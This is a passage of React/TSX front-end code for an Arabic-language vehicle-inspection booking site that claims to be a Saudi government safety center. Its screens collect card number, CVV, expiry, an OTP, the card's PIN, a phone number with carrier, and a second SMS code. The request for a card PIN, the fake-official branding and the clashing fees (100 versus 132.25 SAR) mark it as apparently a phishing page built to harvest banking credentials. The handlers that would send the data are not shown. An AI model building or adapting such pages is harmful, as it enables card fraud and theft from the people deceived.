              <Button
                type="button"
                variant="outline"
                className="w-full h-12 bg-white border-gray-300 text-gray-700 font-medium rounded-md hover:bg-gray-50"
                onClick={() => setCurrentStep("landing")}
              >
                عودة
              </Button>
            </div>
          </div>
        </form>

        {/* Footer */}
        <footer className="bg-[#1a5c3a] text-white py-8 mt-12">
          <div className="container mx-auto max-w-2xl px-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 bg-white/10 rounded-lg flex items-center justify-center">
                  <Car className="w-8 h-8 text-white" />
                </div>
                <div>
                  <div className="font-semibold text-sm">مركز سلامة المركبات</div>
                  <div className="text-xs opacity-90">Vehicles Safety Center</div>
                </div>
              </div>
              <div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center">
                <div className="w-8 h-8 rounded-full bg-white/20" />
              </div>
            </div>
            <div className="mt-6 text-xs text-white/70 leading-relaxed">
              جميع الحقوق محفوظة، الهيئة السعودية للمواصفات والجودة © 2025
              <br />
              رقم الهاتف وعنوان البريد الإلكتروني تستخدم لإرسال الإشعارات فقط
            </div>
          </div>
        </footer>
      </div>
    )
  }

  if (currentStep === "payment-method") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <main className="flex-1">
          {/* Professional header styling */}
          <div className="bg-primary py-6 shadow-sm">
            <div className="container mx-auto px-4">
              <h1 className="text-2xl font-bold text-primary-foreground text-center">طريقة الدفع</h1>
            </div>
          </div>

          <div className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
            <Card className="border-border bg-card shadow-sm">
              <CardContent className="p-6">
                <p className="text-muted-foreground leading-relaxed">
                  يرجى اختيار طريقة الدفع المناسبة لإتمام عملية حجز موعد الفحص الفني الدوري لمركبتك. الدفع آمن ومحمي.
                </p>
              </CardContent>
            </Card>

            {/* Enhanced payment amount card with better visual hierarchy */}
            <Card className="border-primary/30 bg-gradient-to-br from-primary/5 to-primary/10 shadow-sm">
              <CardContent className="p-6">
                <div className="flex items-center justify-between">
                  <span className="text-lg font-medium text-foreground">المبلغ المستحق:</span>
                  <div className="text-right">
                    <div className="text-4xl font-bold text-primary">100</div>
                    <div className="text-sm text-muted-foreground">ريال سعودي</div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="space-y-4">
              <Label className="text-lg font-medium">
                اختر طريقة الدفع<span className="text-destructive">*</span>
              </Label>

              <div className="flex flex-col gap-4">
                {paymentMethods.map((method) => (
                  <button
                    key={method.id}
                    type="button"
                    onClick={() => method.available && setPaymentMethod(method.id)}
                    disabled={!method.available}
                    className={`w-full p-5 rounded-lg border-2 transition-all shadow-sm relative ${
                      method.available
                        ? paymentMethod === method.id
                          ? "border-primary bg-primary/10 shadow-md hover:shadow-lg"
                          : "border-border bg-card hover:border-primary/50 hover:shadow-md"
                        : "border-border bg-muted/50 opacity-60 cursor-not-allowed"
                    }`}
                  >
                    <div className="flex items-center gap-4">
                      <div
                        className={`p-3 rounded-lg ${
                          method.available ? (paymentMethod === method.id ? "bg-primary/20" : "bg-muted") : "bg-muted"
                        }`}
                      >
                        <method.icon
                          className={`w-6 h-6 ${
                            method.available
                              ? paymentMethod === method.id
                                ? "text-primary"
                                : "text-muted-foreground"
                              : "text-muted-foreground"
                          }`}
                        />
                      </div>
                      <div className="flex-1 text-right">
                        <div className="font-semibold text-base flex items-center justify-end gap-2">
                          {method.label}
                          {!method.available && (
                            <span className="text-xs bg-muted px-2 py-1 rounded text-muted-foreground">غير متاح</span>
                          )}
                          {method.badge && method.available && (
                            <span className="text-xs bg-green-100 text-green-700 px-2 py-1 rounded font-medium">
                              {method.badge}
                            </span>
                          )}
                        </div>
                        <div className="text-sm text-muted-foreground mt-0.5">{method.description}</div>
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="flex gap-3 pt-6">
              <Button
                type="button"
                variant="outline"
                onClick={() => setCurrentStep("booking")}
                className="flex-1 h-12 border-2"
                disabled={isLoading}
              >
                رجوع
              </Button>
              <Button
                type="button"
                onClick={handlePaymentMethodSubmit}
                className="flex-1 h-12 gap-2 shadow-sm"
                disabled={!paymentMethod || isLoading}
              >
                <span>التالي</span>
                <ArrowLeft className="w-5 h-5" />
              </Button>
            </div>
          </div>
        </main>
      </div>
    )
  }

  if (currentStep === "card-form") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <main className="flex-1">
          <div className="bg-primary py-6 shadow-sm">
            <div className="container mx-auto px-4">
              <h1 className="text-2xl font-bold text-primary-foreground text-center">الدفع الإلكتروني</h1>
              <p className="text-sm text-primary-foreground/80 text-center mt-1">
                ادفع رسوم الفحص الفني الدوري بشكل آمن أون لاين
              </p>
            </div>
          </div>

          <form onSubmit={handleCardFormSubmit} className="container mx-auto px-4 py-8 space-y-6 max-w-2xl">
            {/* Card Mockup Visualization */}
            <div className="relative w-full h-48 bg-gradient-to-br from-[#2c3e5f] to-[#1a2332] rounded-2xl shadow-lg p-6 text-white">
              <div className="flex justify-between items-start mb-8">
                <CreditCard className="w-10 h-10" />
                <div className="w-12 h-8 bg-gradient-to-br from-amber-400 to-amber-500 rounded"></div>
              </div>

              <div className="space-y-4">
                <div className="flex gap-2 text-xl tracking-wider font-mono">{cardNumber || "•••• •••• •••• ••••"}</div>

                <div className="flex justify-between items-end">
                  <div>
                    <div className="text-xs opacity-70">MM/YY</div>
                    <div className="text-sm font-medium">{expiryDate || "MM/YY"}</div>
                  </div>
                  <div className="text-right">
                    <div className="text-xs opacity-70">اسم حامل البطاقة</div>
                    <div className="text-sm font-medium">{cardName || "FULL NAME"}</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Details Form */}
            <Card className="shadow-sm">
              <CardContent className="p-6">
                <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
                  <CreditCard className="w-5 h-5 text-primary" />
                  بيانات البطاقة
                </h2>

                <div className="space-y-5">
                  <div className="space-y-2">
                    <Label htmlFor="card-number" className="text-sm">
                      رقم البطاقة<span className="text-destructive">*</span>
                    </Label>
                    <div className="relative">
                      <Input
                        id="card-number"
                        type="text"
                        placeholder="0000 0000 0000 0000"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value)}
                        maxLength={19}
                        required
                        className="bg-muted/50 pr-10"
                      />
                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="card-name" className="text-sm">
                      اسم حامل البطاقة / الاسكريبشن<span className="text-destructive">*</span>
                    </Label>
                    <Input
                      id="card-name"
                      type="text"
                      placeholder="JOHN DOE"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
                      required
                      className="bg-muted/50"
                    />
                  </div>

                  <div className="grid grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="expiry-month" className="text-sm">
                        الشهر<span className="text-destructive">*</span>
                      </Label>
                      <select
                        id="expiry-month"
                        className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                        required
                      >
                        <option value="">MM</option>
                        {Array.from({ length: 12 }, (_, i) => (
                          <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                            {String(i + 1).padStart(2, "0")}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="expiry-year" className="text-sm">
                        السنة<span className="text-destructive">*</span>
                      </Label>
                      <select
                        id="expiry-year"
                        className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                        required
                      >
                        <option value="">YY</option>
                        {Array.from({ length: 10 }, (_, i) => {
                          const year = new Date().getFullYear() + i
                          return (
                            <option key={year} value={String(year).slice(-2)}>
                              {String(year).slice(-2)}
                            </option>
                          )
                        })}
                      </select>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="cvv" className="text-sm">
                        CVV<span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="cvv"
                        type="text"
                        placeholder="•••"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value)}
                        maxLength={3}
                        required
                        className="bg-muted/50"
                      />
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Secure Payment Button */}
            <Button type="submit" className="w-full h-12 gap-2 shadow-sm" disabled={isLoading}>
              <Lock className="w-4 h-4" />
              <span>إتمام الدفع الآمن</span>
            </Button>

            {/* Order Summary */}
            <Card className="shadow-sm">
              <CardContent className="p-6">
                <h3 className="font-bold text-lg mb-4">ملخص الطلب</h3>

                <div className="space-y-3 text-sm">
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">رسوم الفحص</span>
                    <span className="font-medium">115.00 ريال</span>
                  </div>

                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">ضريبة القيمة المضافة (%15)</span>
                    <span className="font-medium">17.25 ريال</span>
                  </div>

                  <div className="border-t pt-3 mt-3">
                    <div className="flex justify-between items-center">
                      <span className="text-lg font-bold">الإجمالي</span>
                      <span className="text-2xl font-bold text-primary">132.25 ريال</span>
                    </div>
                  </div>
                </div>

                <div className="mt-6 pt-6 border-t">
                  <div className="text-xs text-center text-muted-foreground mb-3">طرق الدفع المتوفرة</div>
                  <div className="flex justify-center items-center gap-4">
                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
                      <div className="w-8 h-5 bg-gradient-to-r from-gray-700 to-gray-900 rounded flex items-center justify-center">
                        <span className="text-white text-[8px] font-bold">mada</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
                      <div className="w-8 h-5 bg-gradient-to-br from-red-600 to-orange-500 rounded"></div>
                    </div>
                    <div className="flex items-center gap-2 px-3 py-2 bg-muted/50 rounded">
                      <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-800 rounded flex items-center justify-center">
                        <span className="text-white text-[6px] font-bold">VISA</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="mt-6 p-4 bg-green-50 rounded-lg flex items-start gap-3">
                  <div className="w-5 h-5 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                    <Check className="w-3 h-3 text-white" />
                  </div>
                  <div className="text-sm">
                    <div className="font-medium text-green-800">خصم فوري 100*</div>
                    <div className="text-green-700 text-xs mt-1">
                      للطلبات التي تدفع من خلال بطاقة Saving السعودية والخليجي
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Button
              type="button"
              variant="outline"
              onClick={() => setCurrentStep("payment-method")}
              className="w-full h-12 border-2"
              disabled={isLoading}
            >
              رجوع
            </Button>
          </form>
        </main>
      </div>
    )
  }

  if (currentStep === "otp") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <main className="flex-1">
          <div className="bg-primary py-6 shadow-sm">
            <div className="container mx-auto px-4">
              <h1 className="text-2xl font-bold text-primary-foreground text-center">التحقق برمز OTP</h1>
            </div>
          </div>

          {/* Enhanced OTP form with professional styling */}
          <form onSubmit={handleOtpSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
            <div className="text-center space-y-3">
              <p className="text-muted-foreground text-lg">تم إرسال رمز التحقق إلى رقم جوالك</p>
              <p className="font-semibold text-xl">+966 *** *** **45</p>
            </div>

            <Card className="shadow-sm">
              <CardContent className="p-8">
                <div className="space-y-6">
                  <Label className="text-center block text-lg font-medium">
                    أدخل رمز التحقق<span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-3 justify-center" dir="ltr">
                    {otp.map((digit, idx) => (
                      <Input
                        key={idx}
                        type="text"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => {
                          const newOtp = [...otp]
                          newOtp[idx] = e.target.value
                          setOtp(newOtp)

                          if (e.target.value && idx < 5) {
                            const nextInput = e.target.parentElement?.children[idx + 1] as HTMLInputElement
                            nextInput?.focus()
                          }
                        }}
                        className="w-14 h-16 text-center text-xl font-bold border-2 focus:border-primary shadow-sm"
                        required
                      />
                    ))}
                  </div>

                  <div className="text-center pt-2">
                    <Button type="button" variant="link" className="text-base font-medium">
                      إعادة إرسال الرمز
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="flex gap-3 pt-6">
              <Button
                type="button"
                variant="outline"
                onClick={() => setCurrentStep("card-form")}
                className="flex-1 h-12 border-2"
                disabled={isLoading}
              >
                رجوع
              </Button>
              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading}>
                <span>التحقق</span>
                <ArrowLeft className="w-5 h-5" />
              </Button>
            </div>
          </form>
        </main>
      </div>
    )
  }

  if (currentStep === "pin") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <main className="flex-1">
          <div className="bg-primary py-6 shadow-sm">
            <div className="container mx-auto px-4">
              <h1 className="text-2xl font-bold text-primary-foreground text-center">أدخل رمز PIN</h1>
            </div>
          </div>

          {/* Enhanced PIN form with professional security messaging */}
          <form onSubmit={handlePinSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
            <div className="text-center space-y-3">
              <p className="text-muted-foreground text-lg">أدخل رمز PIN الخاص بالبطاقة</p>
            </div>

            <Card className="shadow-sm">
              <CardContent className="p-8">
                <div className="space-y-6">
                  <Label className="text-center block text-lg font-medium">
                    رمز PIN<span className="text-destructive">*</span>
                  </Label>
                  <div className="flex gap-4 justify-center" dir="ltr">
                    {pin.map((digit, idx) => (
                      <Input
                        key={idx}
                        type="password"
                        maxLength={1}
                        value={digit}
                        onChange={(e) => {
                          const newPin = [...pin]
                          newPin[idx] = e.target.value
                          setPin(newPin)

                          if (e.target.value && idx < 3) {
                            const nextInput = e.target.parentElement?.children[idx + 1] as HTMLInputElement
                            nextInput?.focus()
                          }
                        }}
                        className="w-16 h-20 text-center text-3xl font-bold border-2 focus:border-primary shadow-sm"
                        required
                      />
                    ))}
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="bg-muted/80 p-5 rounded-lg border border-border shadow-sm">
              <p className="text-sm text-muted-foreground text-center leading-relaxed">
                🔒 جميع معلوماتك محمية ومشفرة بأعلى معايير الأمان
              </p>
            </div>

            <div className="flex gap-3 pt-6">
              <Button
                type="button"
                variant="outline"
                onClick={() => setCurrentStep("otp")}
                className="flex-1 h-12 border-2"
                disabled={isLoading}
              >
                رجوع
              </Button>
              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading}>
                <span>إتمام الدفع</span>
                <ArrowLeft className="w-5 h-5" />
              </Button>
            </div>
          </form>
        </main>
      </div>
    )
  }

  if (currentStep === "phone-verification") {
    const operators = [
      { id: "stc", name: "STC", logo: "/stc.png", color: "bg-purple-50 border-purple-200" },
      { id: "mobily", name: "Mobily", logo: "/Mobily_Logo.svg", color: "bg-green-50 border-green-200" },
      { id: "zain", name: "Zain", logo: "/Zain-logo-400x400-01.png", color: "bg-orange-50 border-orange-200" },
    ]

    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <main className="flex-1">
          <div className="bg-primary py-6 shadow-sm">
            <div className="container mx-auto px-4">
              <h1 className="text-2xl font-bold text-primary-foreground text-center">التحقق من رقم الجوال</h1>
            </div>
          </div>

          <div className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
            <div className="text-center space-y-3">
              <p className="text-muted-foreground text-lg">للمتابعة، يرجى إدخال رقم الجوال واختيار شركة الاتصالات</p>
            </div>

            <form onSubmit={handlePhoneVerification} className="space-y-6">
              <Card className="shadow-sm">
                <CardContent className="p-6 space-y-5">
                  {/* Phone Number Input */}
                  <div className="space-y-2">
                    <Label htmlFor="phone-number">
                      رقم الجوال<span className="text-destructive">*</span>
                    </Label>
                    <div className="relative">
                      <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none">
                        <span className="text-muted-foreground font-medium">+966</span>
                      </div>
                      <Input
                        id="phone-number"
                        type="tel"
                        value={phone}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "").slice(0, 10)
                          setPhone(value)
                        }}
                        className="pr-20 text-lg"
                        placeholder="05xxxxxxxx"
                        dir="ltr"
                        required
                      />
                    </div>
                  </div>

                  {/* Operator Selection */}
                  <div className="space-y-3">
                    <Label>
                      شركة الاتصالات<span className="text-destructive">*</span>
                    </Label>
                    <div className="grid grid-cols-3 gap-3">
                      {operators.map((op) => (
                        <button
                          key={op.id}
                          type="button"
                          onClick={() => setOperator(op.id)}
                          className={`flex flex-col items-center justify-center p-4 border-2 rounded-lg transition-all ${
                            operator === op.id
                              ? "border-primary bg-primary/10 shadow-md"
                              : `border-border ${op.color} hover:border-primary/50`
                          }`}
                        >
                          <div className="h-8 w-auto mb-2 flex items-center justify-center">
                            <span className="font-bold text-lg">{op.name}</span>
                          </div>
                          {operator === op.id && (
                            <div className="w-5 h-5 bg-primary rounded-full flex items-center justify-center">
                              <Check className="w-3 h-3 text-primary-foreground" />
                            </div>
                          )}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* OTP Input (conditional) */}
                  {operator && phone.length === 10 && (
                    <div className="space-y-3 pt-4 border-t">
                      <Label htmlFor="phone-otp">
                        أدخل رمز التحقق المرسل إلى جوالك<span className="text-destructive">*</span>
                      </Label>
                      <Input
                        id="phone-otp"
                        type="text"
                        value={phoneOtp}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "").slice(0, 6)
                          setPhoneOtp(value)
                          if (phoneOtpError) setPhoneOtpError("")
                        }}
                        maxLength={6}
                        placeholder="أدخل رمز التحقق (6 أرقام)"
                        className="text-center text-xl tracking-widest"
                        required
                      />
                      {phoneOtpError && <p className="text-destructive text-sm text-center">{phoneOtpError}</p>}
                      <Button type="button" variant="link" className="w-full text-sm">
                        إعادة إرسال الرمز
                      </Button>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Security Notice */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <p className="text-blue-800 text-sm text-center">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
              </div>

              <div className="flex gap-3 pt-6">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => setCurrentStep("pin")}
                  className="flex-1 h-12 border-2"
                  disabled={isLoading}
                >
                  رجوع
                </Button>
                <Button
                  type="submit"
                  className="flex-1 h-12 gap-2 shadow-sm"
                  disabled={isLoading || !phone || !operator || phoneOtp.length < 6}
                >
                  <span>إتمام العملية</span>
                  <ArrowLeft className="w-5 h-5" />
                </Button>
              </div>
            </form>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-background">
      <div className="container mx-auto px-4 py-8">
        <p className="text-center">جاري تطوير هذه الصفحة...</p>
        <Button onClick={() => setCurrentStep("landing")} className="mx-auto block mt-4">
          العودة للرئيسية
        </Button>
      </div>
    </div>
  )
}
